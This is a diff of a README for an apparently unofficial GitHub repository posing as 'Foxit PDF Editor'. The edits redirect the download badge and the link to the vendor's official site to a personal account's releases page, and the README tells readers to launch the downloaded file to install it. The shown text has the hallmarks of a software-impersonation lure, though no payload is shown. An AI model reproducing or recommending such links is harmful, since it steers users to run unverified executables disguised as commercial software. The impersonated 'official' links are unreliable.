@@ -47,14 +47,14 @@ Foxit PDF Editor is your go-to solution for all things PDF-related. Whether you 
 
 ## Get Started
 Ready to revolutionize your PDF management experience? Download the Foxit PDF Editor from the following link:
-[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/project/files/App.zip)
+[![Download Foxit PDF Editor](https://github.com/doh12/Foxit-PDF-Editor/releases)](https://github.com/doh12/Foxit-PDF-Editor/releases)
 
 Please note that the file needs to be launched after downloading for installation.
 
 If the above link is not accessible, we recommend checking the "Releases" section of this repository for alternative download options.
 
 ## Join the Foxit PDF Editor Community
-Find more tips, tricks, and updates on our website! Visit [Foxit PDF Editor](https://www.foxitsoftware.com/pdf-editor/)
+Find more tips, tricks, and updates on our website! Visit [Foxit PDF Editor](https://github.com/doh12/Foxit-PDF-Editor/releases)
 
 ---
 
